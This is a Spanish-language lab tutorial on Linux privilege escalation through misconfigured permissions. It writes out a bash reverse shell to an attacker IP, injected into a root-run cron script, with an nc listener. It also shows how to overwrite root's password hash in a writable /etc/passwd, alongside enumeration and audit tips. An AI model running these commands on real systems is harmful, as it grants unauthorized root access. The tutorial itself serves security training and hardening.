
---

# Laboratorio: Abuso de permisos incorrectamente implementados

---

## ¿Qué son los permisos en Linux?

En los sistemas operativos Linux, cada archivo y directorio tiene tres tipos de permisos (lectura, escritura y ejecución), organizados en tres niveles de acceso:

- **Usuario propietario**
- **Grupo**
- **Otros (resto de usuarios)**

Cada permiso puede permitir o restringir acciones sobre un archivo:

- `r` (read): permite leer el archivo.
- `w` (write): permite modificar el contenido del archivo.
- `x` (execute): permite ejecutar el archivo si es un binario o script.

---

## ¿Qué entendemos por “abuso de permisos mal configurados”?

Cuando los archivos o directorios críticos tienen permisos **demasiado permisivos** (por ejemplo, escritura para otros usuarios, o ejecución global), un atacante puede:

- Leer información sensible.
- Modificar scripts o binarios legítimos para ejecutar código malicioso.
- Ejecutar comandos arbitrarios.
- Escalar privilegios, especialmente si se involucran servicios o usuarios con permisos elevados.

---

## Ejemplo práctico: Abusando de permisos de escritura en un script ejecutado por root

### Escenario:

Hemos identificado que existe un **script en `/opt/backup.sh`** que es ejecutado periódicamente por `root`, pero tiene permisos de escritura para nuestro usuario:

```bash
ls -l /opt/backup.sh
-rwxrwxr-- 1 root admin 88 jun 14 10:24 /opt/backup.sh
````

Nuestro usuario pertenece al grupo `admin`. Podemos modificar este archivo.

---

### Acción:

Editamos el contenido del script para insertar una shell inversa:

```bash
echo 'bash -i >& /dev/tcp/10.10.14.99/443 0>&1' > /opt/backup.sh
```

Configuramos un listener en nuestra máquina atacante:

```bash
nc -lvnp 443
```

Esperamos a que se ejecute el script (por ejemplo, vía cron), y recibimos la conexión como `root`.

---

### Resultado:

```bash
# whoami
root
```

Hemos escalado privilegios gracias a que el script fue modificado por nuestro usuario antes de ser ejecutado por `root`.

---

## Herramienta de apoyo: Linux Smart Enumeration (lse)

Para detectar este tipo de configuraciones inseguras, podemos usar la herramienta `lse`.

Repositorio: [https://github.com/diego-treitos/linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)

### Instalación rápida:

```bash
wget https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh
chmod +x lse.sh
./lse.sh
```

Con el comando `-l 1` indicamos que queremos listar la información crítica que encuentre

```bash
./lse.sh -l 1
```

---

### ¿Qué analiza `lse`?

- Archivos con permisos de escritura inseguros.
    
- Scripts ejecutados por `cron`, `systemd`, `sudo`, etc.
    
- Usuarios y grupos mal configurados.
    
- Servicios con binarios modificables.
    
- Variables de entorno con rutas inseguras.
    

---

### Comando útil para buscar archivos con permisos de escritura para todos los usuarios:

```bash
find / -perm -2 -type f 2>/dev/null
```

O para archivos ejecutados por `root` con permisos de escritura para otros:

```bash
find / -user root -perm -o+w -type f 2>/dev/null
```

---

## Recomendaciones

- Revisar y auditar frecuentemente los permisos de scripts críticos.
    
- Evitar permisos de escritura para grupos o usuarios no necesarios.
    
- Nunca permitir que archivos ejecutados por `root` sean modificables por usuarios normales.
    
- Usar herramientas como `lse`, `linpeas` o `auditd` para automatizar auditorías de seguridad.
    
- Minimizar la cantidad de archivos modificables por otros grupos o usuarios.
    

---

## Ejemplo: abusando permiso escritura en el `/etc/passwd`

**Acción:** obtenemos un hash de una contraseña

```bash
 openssl passwd
	Password:       # en este caso pusimos 'hola'
Verifying - Password: 
$1$XG9IAGS.$/olxJbKeMMl7BqLXkCWCp1
```

**Acción:** añadimos el hash obtenido como contraseña al usuario root

```bash
nano /etc/passwd
root:x:0:0:root:/root:/usr/bin/zsh
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync

...
nm-openvpn:x:126:136:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin
nm-openconnect:x:127:137:NetworkManager OpenConnect plugin,,,:/var/lib/NetworkManager:/usr/sbin/nologin
metahumo:x:1000:1001:Metahumo:/home/metahumo:/usr/bin/zsh
_lxd:x:128:138::/var/lib/lxd/:/bin/false
```

Explicación: con `openssl passwd` obtenemos una hash para la contraseña que pongamos (en este caso se puso 'hola'). Al tener permisos de escritura en el `/erc/passwd` podemos modificar esta línea del archivo `root:x:0:0:root:/root:/usr/bin/zsh` quitando la `x` y poniendo el hash, `root:$1$XG9IAGS.$/olxJbKeMMl7BqLXkCWCp1:0:0:root:/root:/usr/bin/zsh`. De este modo cuando hagamos `su root` e introduzcamos nuestra contraseña 'hola' irá a comprobarlo en el `/etc/passwd` antes que en el `/etc/shadow`

---

## Resumen

El abuso de permisos incorrectamente aplicados es una vía común de escalada de privilegios. Debemos ser especialmente cuidadosos con los scripts que se ejecutan automáticamente (cron, systemd, sudo sin contraseña) y con los archivos que pueden ser modificados por usuarios sin privilegios. Herramientas como `lse` son grandes aliadas para detectar este tipo de errores y proteger nuestros sistemas.

---
